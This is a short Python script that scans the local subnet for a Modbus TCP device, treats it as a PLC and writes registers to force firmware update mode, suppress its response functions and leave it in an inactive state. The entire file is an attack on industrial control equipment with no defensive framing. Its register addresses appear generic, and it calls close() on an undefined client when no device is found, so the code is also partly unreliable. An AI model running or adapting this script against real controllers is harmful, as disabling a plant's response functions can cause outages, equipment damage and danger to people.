from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to activate firmware update mode
def activate_firmware_update_mode(client):
    try:
        # Write to the register that controls the firmware update mode
        client.write_register(0x1000, 0x01)
        print("Firmware update mode activated")
    except Exception as e:
        print(f"Failed to activate firmware update mode: {e}")

# Function to prevent expected response functions from engaging
def prevent_response_functions(client):
    try:
        # Write to the register that controls the response functions
        client.write_register(0x1001, 0x00)
        print("Expected response functions prevented from engaging")
    except Exception as e:
        print(f"Failed to prevent response functions: {e}")

# Function to leave the device in an inactive holding state
def leave_device_in_inactive_state(client):
    try:
        # Write to the register that controls the device state
        client.write_register(0x1002, 0x02)
        print("Device left in inactive holding state")
    except Exception as e:
        print(f"Failed to leave device in inactive state: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        
        # Activate firmware update mode
        activate_firmware_update_mode(client)
        
        # Prevent expected response functions from engaging
        prevent_response_functions(client)
        
        # Leave the device in an inactive holding state
        leave_device_in_inactive_state(client)
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()